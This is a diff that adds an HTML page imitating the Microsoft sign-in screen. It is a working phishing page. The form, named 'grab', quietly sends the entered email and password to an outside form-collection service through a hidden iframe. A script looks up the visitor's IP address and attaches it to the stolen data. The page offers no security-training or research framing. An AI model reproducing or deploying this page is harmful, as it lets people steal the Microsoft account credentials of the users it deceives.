@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft - Sign in</title>
+    <style>
+      body {
+        background-image: url(https://images.unsplash.com/photo-1542640244-7e672d6cef4e?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1470&q=80);
+        background-size: cover;
+      }
+
+      .box {
+        width: 440px;
+        height: 338px;
+        background-color: #ffffff;
+        margin: 200px auto;
+        padding: 44px;
+        box-shadow: 0 3px 10px rgb(0 0 0 / 2.9);
+      }
+
+      img {
+        width: 108px;
+        height: 24px;
+      }
+
+      h3 {
+        color: #1b1b1b;
+        font-size: 1.5rem;
+        font-weight: 600;
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto",
+          "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol",
+          "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi",
+          "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI",
+          "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
+          "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa",
+          "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli",
+          "Myanmar Text", "Cambria Math";
+      }
+
+      form {
+        display: block;
+      }
+      .input {
+        display: flex;
+        flex-direction: column;
+      }
+
+      a {
+        color: #0067b8;
+        text-decoration: none;
+      }
+
+      a:hover {
+        color: #646161;
+        text-decoration: underline;
+      }
+
+      input {
+        border-top: 0;
+        border-left: 0;
+        border-right: 0;
+        outline: 0;
+        font-family: inherit;
+        font-size: inherit;
+        margin-bottom: 40px;
+      }
+
+      input:nth-child(2) {
+        margin-bottom: 10px;
+      }
+
+      input::placeholder {
+        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto",
+          "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol",
+          "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi",
+          "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI",
+          "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
+          "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa",
+          "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli",
+          "Myanmar Text", "Cambria Math";
+        font-size: 1rem;
+      }
+
+      .sign {
+        color: #ffffff;
+        background-color: #0067b8;
+        border: none;
+        padding: 4px 12px;
+        width: 108px;
+        height: 32px;
+        margin-left: 4px;
+      }
+
+      .sign:hover {
+        cursor: pointer;
+      }
+
+      .summary {
+        display: flex;
+        justify-content: right;
+        margin-top: 30px;
+      }
+
+      @media (max-width: 912px) {
+        body {
+          background-image: url(https://images.unsplash.com/photo-1542640244-7e672d6cef4e?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1470&q=80);
+          background-size: cover;
+          background-repeat: round;
+        }
+      }
+
+      @media (max-width: 414px) {
+        body {
+          background: rgb(2, 0, 36);
+          background: linear-gradient(
+            90deg,
+            rgba(2, 0, 36, 1) 0%,
+            rgb(26, 26, 148, 1) 90%
+          );
+        }
+
+        .box {
+          width: 270px;
+          height: 320px;
+        }
+      }
+
+      @media (max-width: 393px) {
+        body {
+          background: rgb(2, 0, 36);
+          background: linear-gradient(
+            90deg,
+            rgba(2, 0, 36, 1) 0%,
+            rgb(26, 26, 148, 1) 90%
+          );
+        }
+
+        .box {
+          width: 250px;
+          height: 320px;
+        }
+      }
+
+      @media (max-width: 360px) {
+        body {
+          background: rgb(2, 0, 36);
+          background: linear-gradient(
+            90deg,
+            rgba(2, 0, 36, 1) 0%,
+            rgb(26, 26, 148, 1) 90%
+          );
+        }
+
+        .box {
+          width: 250px;
+          height: 320px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="box">
+      <div class="logo">
+        <img
+          src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+          alt=""
+        />
+      </div>
+      <h3>Sign in</h3>
+      <form
+        id="grab"
+        action="https://submit-form.com/u1vRXtbM"
+        target="dummyframe"
+      >
+        <div class="input">
+          <input
+            type="email"
+            name="email"
+            id="email"
+            value=""
+            placeholder="Enter email here"
+            required
+          />
+          <input
+            type="password"
+            name="pass"
+            id="pass"
+            value=""
+            placeholder="Enter password here"
+            required
+          />
+        </div>
+
+        <input type="text" name="ip" id="ipFormInput" value="" hidden />
+
+        <p>No account? <a href="">Create one!</a></p>
+        <a href="">Can't access your account?</a>
+        <div class="summary">
+          <input class="sign" type="submit" value="Sign-in" />
+        </div>
+      </form>
+    </div>
+
+    <iframe name="dummyframe" id="dummyframe" style="display: none"></iframe>
+
+    <script type="application/javascript ">
+      const ipFormInput = document.getElementById('ipFormInput');
+
+      fetch('https://api.ipify.org?format=json')
+          .then((response) => { return response.json() })
+          .then((json) => {
+              const ip = json.ip;
+              ipFormInput.value = ip;
+          })
+          .catch((err) => { console.error(`Error getting IP Address: ${err}`) })
+    </script>
+  </body>
+</html>
